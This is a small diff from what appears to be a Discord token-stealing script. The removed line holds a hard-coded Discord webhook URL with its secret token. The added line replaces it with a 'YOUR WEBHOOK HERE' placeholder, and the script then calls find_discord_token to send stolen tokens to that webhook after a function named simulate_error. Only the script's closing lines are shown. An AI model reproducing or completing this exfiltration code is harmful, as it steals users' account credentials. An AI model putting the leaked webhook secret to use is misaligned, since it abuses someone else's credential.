@@ -74,5 +74,5 @@ def simulate_error():
 if __name__ == "__main__":
     simulate_error()
 
-    webhook_url = 'https://discord.com/api/webhooks/1281626784147968000/iIe6pQfHMZagjtHw1AfNM4x7AsDv2sVkLGZKB3jrkmlNx8k0PMOjWDEoe4V5Ia_4XlD2'
+    webhook_url = 'YOUR_WEBHOOK' # YOUR WEBHOOK HERE!!!!
     find_discord_token(webhook_url)
